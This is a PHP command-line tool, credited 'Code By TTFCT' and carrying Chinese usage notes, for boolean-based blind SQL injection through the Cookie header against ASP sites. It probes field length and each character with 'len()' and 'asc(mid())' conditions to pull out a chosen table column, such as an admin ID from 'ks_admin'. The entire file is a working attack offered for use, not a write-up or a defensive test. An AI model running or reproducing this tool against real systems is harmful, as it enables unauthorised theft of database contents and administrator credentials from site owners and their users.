<?php
error_reporting(7);
ini_set("max_execution_time",0);
print_r('
-----------------------------------Code By TTFCT-----------------------------
');
if($argc<>8){
print_r('
数字型:
Example: '.$argv[0].' ttfct.com /test/ttfct.asp id 10 html table column

');
print_r('
字符型：
Example: '.$argv[0].' ttfct.com /test/ttfct.asp name admin\' html table column
');
die();}
global $Mtable,$vls,$Mcol,$Seet,$Seec;
$host=$argv[1];$path=$argv[2];
$Mid=$argv[3];$Mnum=$argv[4];
$info=$argv[5];

guessall();

function send($cookie){
global $host,$path,$message;
$message = "GET $path HTTP/1.0\n";
$message .= "Referer: 127.0.0.1\r\n";
$message .= "Host: 127.0.0.1\r\n";
$message .= "Cookie: ".$cookie."\r\n";
$message.="Accept: text/plain\r\n";
$message.="Connection: Close\r\n\r\n"; # echo $message;
$fp = fsockopen( $host, 80 );
fputs($fp,$message);
while($fp&&!feof($fp)) {
$resp .= fread($fp,1024);}
fclose($fp);
return $resp;
}

function getright(){
global $Mid,$Mnum,$host,$path,$info;
if(strpos(urlencode($Mnum),"%27"))
$Tmpcookie1=$Mid."=".urlencode($Mnum)." and%20%271%27%3D%271";
else
$Tmpcookie1=$Mid."=".urlencode($Mnum)." and%201%3D1";
$Get1=strstr(send($Tmpcookie1),$info);
return $Get1;
}

//猜解字段长度及字段内容
function guessall(){
global $Mid,$Mnum,$host,$path,$info;
/*
---------------------------设置------------------------------------ */
//$cols="adminid"; //替换成自己的
$cols=$argv[7];
//$tables="ks_admin"; //替换成自己的
$tables=$argv[6];
/*
---------------------------完成-------------------------------------*/
$k=0;$tmpname="";
/*$TTFCT=array("a"=>97,"b"=>98,"c"=>99,"d"=>100,"e"=>101,"f"=>102,"0"=>48,"1"=>49,
"2"=>50,"3"=>51,"4"=>52,"5"=>53,"6"=>54,"7"=>55,"8"=>56,"9"=>57);*/
$TTFCT=array("a"=>97,"b"=>98,"c"=>99,"d"=>100,"e"=>101,"f"=>102,"g"=>103
,"h"=>104,"i"=>105,"j"=>106,"k"=>107,"l"=>108,"m"=>109,"n"=>110,
"o"=>111,"p"=>112,"q"=>113,"r"=>114,"s"=>115,"t"=>116,"u"=>117,"v"=>118,"w"=>119,"x"=>120,
"y"=>121,"z"=>122,"A"=>65,"B"=>66,"C"=>67,"D"=>68,"E"=>69,"F"=>70,"G"=>71,"H"=>72,"I"=>73,"J"=>74,"K"=>75,
"L"=>76,"M"=>77,"N"=>78,"O"=>79,"P"=>80,"Q"=>81,"R"=>82,"S"=>83,"T"=>84,"U"=>85
,"V"=>86,"W"=>87,"X"=>88,"Y"=>89,"Z"=>90,"0"=>48,"1"=>49,
"2"=>50,"3"=>51,"4"=>52,"5"=>53,"6"=>54,"7"=>55,"8"=>56,"9"=>57);
for($i=1;$i<=30;$i++){
echo ".";
if(strpos(urlencode($Mnum),"%27"))
//------------------------------------------这里用修改----------------------------
$sql=" and (select top 1 len($cols)=$i from $tables) and ''='";
//-------------------------------------------修改完成-----------------------------
else
//------------------------------------------这里用修改----------------------------
$sql=" and (select top 1 len($cols)=$i from $tables)";
//-------------------------------------------修改完成-----------------------------
$Tcookie=$Mid."=".urlencode($Mnum).str_replace("+","%20",urlencode($sql));
$Get1=strstr(send($Tcookie),$info);
$Get2=getright();
//echo $sql;
if($Get1==$Get2){
$Tmp.="\rTable: ".$tables."     ";
$Tmp.="Column: ".$cols."     ";
$Tmp.="Length: ".$i."\r\n";
$k=$i;
echo $Tmp;break;}}
for($j=1;$j<=$k;$j++){
foreach($TTFCT as $kx=>$v){
$tvalue1=$v;
if(strpos(urlencode($Mnum),"%27"))
//------------------------------------------这里用修改----------------------------
$sql=" and (select top 1 asc(mid($cols,$j,1))=$tvalue1 from $tables) and ''='";
//-------------------------------------------修改完成-----------------------------
else
//------------------------------------------这里用修改----------------------------
$sql=" and (select top 1 asc(mid($cols,$j,1))=$tvalue1 from $tables)";
//-------------------------------------------修改完成-----------------------------
echo "\r".$cols."[".$j."]=\$TTFCT[$kx]";
//echo "\r".$sql;
$Tcookie=$Mid."=".urlencode($Mnum).str_replace("+","%20",urlencode($sql));
$Get1=strstr(send($Tcookie),$info);
$Get2=getright();
if($Get1==$Get2){
$tmpname.="\$TTFCT//$kx";}
}}
echo "\r\n";
$tmpname=str_replace("$","",$tmpname);
$tmpname=str_replace("TTFCT","",$tmpname);
$tmpname=str_replace("//","",$tmpname);
echo "Content: $tmpname";
}
?>